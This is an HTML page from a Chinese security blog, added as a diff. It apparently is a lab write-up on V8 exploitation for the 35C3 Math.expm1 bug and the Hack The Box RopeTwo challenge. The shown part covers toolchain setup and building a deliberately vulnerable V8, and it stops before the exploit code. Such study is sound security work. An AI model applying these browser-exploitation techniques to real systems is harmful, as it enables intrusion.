@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#0a080b" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0a080b" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#0a080b">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/red/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V8 类型推断与任意读写原语">
+<meta property="og:url" content="https://lucifer11.xyz/knowledge/v8/index.html">
+<meta property="og:site_name" content="0xfd&#39;s blog">
+<meta property="og:description" content="两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb165.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb166.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb167.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb168.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb169.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb170.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v81.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v82.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v83.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v84.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v85.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v86.png">
+<meta property="article:published_time" content="2026-11-25T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-25T04:00:00.000Z">
+<meta property="article:author" content="253">
+<meta property="article:tag" content="JIT">
+<meta property="article:tag" content="V8">
+<meta property="article:tag" content="任意读写">
+<meta property="article:tag" content="指针压缩">
+<meta property="article:tag" content="知识库">
+<meta property="article:tag" content="类型混淆">
+<meta property="article:tag" content="越界访问">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg">
+
+
+<link rel="canonical" href="https://lucifer11.xyz/knowledge/v8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lucifer11.xyz/knowledge/v8/","path":"/knowledge/v8/","title":"V8 类型推断与任意读写原语"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>V8 类型推断与任意读写原语 | 0xfd's blog</title>
+  
+
+
+
+
+
+
+
+<meta name="color-scheme" content="dark">
+<link rel="stylesheet" href="/css/cyberpunk.css">
+<script src="/js/gargantua.js" defer></script>
+<script src="/js/reader.js" defer></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="0xfd's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/fifteen-katana-zero-katana-zero.gif" alt="0xfd's blog">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">0xfd's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by 0xfd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-知识库"><a href="/knowledge/" rel="section"><i class="fa fa-book fa-fw"></i>知识库</a></li><li class="menu-item menu-item-导读"><a href="/guide/" rel="section"><i class="fa fa-compass fa-fw"></i>导读</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-folder-open fa-fw"></i>分类</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9"><span class="nav-text">分析重点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95"><span class="nav-text">案例与技术索引</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9%E4%B8%8B%E7%9A%84-addrof-%E4%B8%8E-fakeobj"><span class="nav-text">指针压缩下的 addrof 与 fakeobj</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B4%9F%E9%9B%B6%E7%B1%BB%E5%9E%8B%E6%8E%A8%E6%96%AD%E4%B8%8E%E8%B6%8A%E7%95%8C%E5%8E%9F%E8%AF%AD"><span class="nav-text">负零类型推断与越界原语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="253"
+      src="/images/fifteen-katana-zero-katana-zero.gif">
+  <p class="site-author-name" itemprop="name">253</p>
+  <div class="site-description" itemprop="description">漏洞分析、利用机制、二进制研究与安全工程</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">312</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lucifer11.xyz/knowledge/v8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/fifteen-katana-zero-katana-zero.gif">
+      <meta itemprop="name" content="253">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xfd's blog">
+      <meta itemprop="description" content="漏洞分析、利用机制、二进制研究与安全工程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="V8 类型推断与任意读写原语 | 0xfd's blog">
+      <meta itemprop="description" content="两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          V8 类型推断与任意读写原语
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-25 12:00:00" itemprop="dateCreated datePublished" datetime="2026-11-25T12:00:00+08:00">2026-11-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">二进制安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%95%E6%93%8E/" itemprop="url" rel="index"><span itemprop="name">浏览器引擎</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>15k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>54 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>两个实验分别来自 35C3 与 RopeTwo 的 V8 环境。本章把类型信息、数组布局、指针压缩和后备存储连接起来，保留编译提交、调试器状态与原始 JavaScript。</p>
+<nav class="kb-tools" aria-label="章节操作">
+<a href="/knowledge/">知识库目录</a>
+<a href="/guide/">研究导读</a>
+<a href="/knowledge/v8/source.md" download>下载 Markdown</a>
+<button type="button" data-expand-evidence>展开全部技术记录</button>
+</nav>
+
+<span id="more"></span>
+
+<h2 id="分析重点"><a href="#分析重点" class="headerlink" title="分析重点"></a>分析重点</h2><p>Math.expm1 题的关键是优化阶段对类型和边界的错误推断。</p>
+<p>RopeTwo 的补丁与指针压缩影响 map、对象地址和任意读写的表达方式。</p>
+<p>文中的地址、布局与 JIT 行为对应各自原版本，相关独立引擎研究见导读。</p>
+<h2 id="案例与技术索引"><a href="#案例与技术索引" class="headerlink" title="案例与技术索引"></a>案例与技术索引</h2><table>
+<thead>
+<tr>
+<th>分析入口</th>
+<th>实验来源</th>
+<th>技术点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#case-chrome-browserv8-pwn">指针压缩下的 addrof 与 fakeobj</a></td>
+<td>chrome-browserv8-pwn</td>
+<td>V8、指针压缩、任意读写</td>
+</tr>
+<tr>
+<td><a href="#case-exploiting-the-math-expm1-typing-bug-in-v8">负零类型推断与越界原语</a></td>
+<td>Exploiting-the-Math-expm1-typing-bug-in-V8</td>
+<td>V8、JIT、类型混淆、越界访问</td>
+</tr>
+</tbody></table>
+<p><a id="case-chrome-browserv8-pwn"></a></p>
+<h2 id="指针压缩下的-addrof-与-fakeobj"><a href="#指针压缩下的-addrof-与-fakeobj" class="headerlink" title="指针压缩下的 addrof 与 fakeobj"></a>指针压缩下的 addrof 与 fakeobj</h2><p>以 RopeTwo 的补丁版 V8 为对象，保留编译提交、数组 map、指针压缩、任意读写及 ArrayBuffer 后备存储的调试关系。</p>
+<p class="kb-provenance">来源 chrome-browserv8-pwn · 原记录 2021-01-23 · 41 个代码块 · 7 处图片引用</p>
+
+<details class="kb-evidence" id="record-chrome-browserv8-pwn">
+<summary>查看分析过程、攻击步骤与完整代码</summary>
+
+<!-- kb:start chrome-browserv8-pwn -->
+
+<h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>V8是由Google开发的著名浏览器Chrome的JavaScript引擎。</p>
+<p>此篇文章专门记录hack the box - ropetwo机器中的chrome浏览器v8引擎的pwn部分。</p>
+<h4 id="step1-环境搭建及工具安装"><a href="#step1-环境搭建及工具安装" class="headerlink" title="step1-环境搭建及工具安装"></a>step1-环境搭建及工具安装</h4><p>在开始实验之前，先把所有环境准备好，本人实验环境是在ubuntu 16.04.1 amd64位的vm虚拟机下进行的。</p>
+<ol>
+<li>安装google的depot_tools</li>
+</ol>
+<figure class="highlight bash" data-code="Z2l0IGNsb25lIGh0dHBzOi8vY2hyb21pdW0uZ29vZ2xlc291cmNlLmNvbS9jaHJvbWl1bS90b29scy9kZXBvdF90b29scy5naXQKCmVjaG8gImV4cG9ydCBQQVRIPS9ob21lL3B3bi90b29scy9kZXBvdF90b29sczokUEFUSCIgPj4gfi8uYmFzaHJjCgpiYXNoCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/home/pwn/tools/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>安装gdb和gdb功能增强插件gef</li>
+</ol>
+<figure class="highlight bash" data-code="YXB0LWdldCBpbnN0YWxsIGdkYgo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1Z3N5L2dlZg==">GEF github<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash" data-code="IyDmiYvliqjlronoo4Xlubblr7zlhaVnZGLliJ3lp4vljJbmlofku7YKJCB3Z2V0IC1PIH4vLmdkYmluaXQtZ2VmLnB5IC1xIGh0dHA6Ly9nZWYuYmxhaC5jYXQvcHkKJCBlY2hvIHNvdXJjZSB+Ly5nZGJpbml0LWdlZi5weSA+PiB+Ly5nZGJpbml0Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手动安装并导入gdb初始化文件</span></span><br><span class="line">$ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py</span><br><span class="line">$ <span class="built_in">echo</span> <span class="built_in">source</span> ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>fetch google v8引擎</li>
+</ol>
+<p><font color="red">fetch之前，请想办法解决让整个ubuntu系统的流量全部走代理，不然会fetch失败</font></p>
+<ul>
+<li>fetch之前先运行以下的命令，初始化gclient工具集，使gclient工具集保持完整，没有这一步，之后的fetch v8一定会失败报错。。。</li>
+</ul>
+<figure class="highlight bash" data-code="Z2NsaWVudAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br></pre></td></tr></table></figure>
+
+<p>接着下载V8的代码以及生成项目文件。fetch v8刚开始的时候会有很长一段时间卡住不动，只是没有输出而已，只要没有报错，就是在正常运行，耐心等待就好了。</p>
+<figure class="highlight bash" data-code="IyDkuIvovb12OOeahHJlcG/lkozlv4XopoHkvp3otZYKZmV0Y2ggdjgKY2QgdjgKLi9idWlsZC9pbnN0YWxsLWJ1aWxkLWRlcHMuc2gK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载v8的repo和必要依赖</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure>
+
+<p>至此所有环境已搭建完毕，之后会介绍编译v8源码成d8的debug和release的版本便于调试, x64.release和x64.debug这两个文件夹中都有一个数据库二进制文件。debug版本将在REPL中提供更多信息，但它不允许在不崩溃(支持fuzzing)的情况下进行越限的读&#x2F;写，所以在开始时使用release版本。</p>
+<h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>连接openvpn到rope2的ip地址，然后下载如下commit的diff文件</p>
+<figure class="highlight bash" data-code="aHR0cDovLzEwLjEwLjEwLjE5Njo1MDAwL3Jvb3QvdjgvY29tbWl0Lzc0MTBmNjgwOWRkMzNlMzE3ZjExZjM5Y2VhZWJhYmE5YTg4ZWE5NzAK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.196:5000/root/v8/commit/7410f6809dd33e317f11f39ceaebaba9a88ea970</span><br></pre></td></tr></table></figure>
+
+<p>点击Options的Plain Diff即可下载.diff文件</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb164.jpg"></li>
+</ul>
+<p>然后到如下链接，点击Download下载具有漏洞的chrome浏览器</p>
+<figure class="highlight bash" data-code="aHR0cDovLzEwLjEwLjEwLjE5Njo4MDAwLwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.196:8000/</span><br></pre></td></tr></table></figure>
+
+<p>然后拷贝r4j之前的一个commit备用</p>
+<figure class="highlight bash" data-code="aHR0cDovL2dpdGxhYi5yb3BlMi5odGI6NTAwMC9yb290L3Y4L2NvbW1pdHMvbWFzdGVyCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://gitlab.rope2.htb:5000/root/v8/commits/master</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash" data-code="ZDkxZThkOGZjYTY0Njc5YzhkZjA1NjAzYjVmZjdlNTg3MDljNDgwMQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d91e8d8fca64679c8df05603b5ff7e58709c4801</span><br></pre></td></tr></table></figure>
+
+<h4 id="step3-编译有漏洞的v8源码"><a href="#step3-编译有漏洞的v8源码" class="headerlink" title="step3-编译有漏洞的v8源码"></a>step3-编译有漏洞的v8源码</h4><figure class="highlight bash" data-code="JCBnaXQgY2hlY2tvdXQgZDkxZThkOGZjYTY0Njc5YzhkZjA1NjAzYjVmZjdlNTg3MDljNDgwMQokIGdjbGllbnQgc3luYwokIGdpdCBhcHBseSAuLi9wYXRjaC5kaWZmIAokIC4vdG9vbHMvZGV2L3Y4Z2VuLnB5IHg2NC5yZWxlYXNlCiQgbmluamEgLUMgLi9vdXQuZ24veDY0LnJlbGVhc2UKJCAuL3Rvb2xzL2Rldi92OGdlbi5weSB4NjQuZGVidWcKJCBuaW5qYSAtQyAuL291dC5nbi94NjQuZGVidWcK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout d91e8d8fca64679c8df05603b5ff7e58709c4801</span><br><span class="line">$ gclient <span class="built_in">sync</span></span><br><span class="line">$ git apply ../patch.diff </span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release</span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></figure>
+
+<h4 id="step4-开始分析调试"><a href="#step4-开始分析调试" class="headerlink" title="step4-开始分析调试"></a>step4-开始分析调试</h4><p>唯一的障碍会偶然发现在这个挑战是指针压缩,这使得在32位地址表示,导致泄漏很难取得成功, 因为隔离root, 上一个地址的32位值用于访问数据在V8堆成了一个问题。但是提到了不需要知道隔离root地址，如果能够设法处理漏洞，得到fakeobj和addrof原语，那么就可以通过指针压缩，这将不会是一个问题。</p>
+<p>首先，需要分析补丁文件，这样就能发现哪些提交了特别的推送更改，并将其准确地推送到:</p>
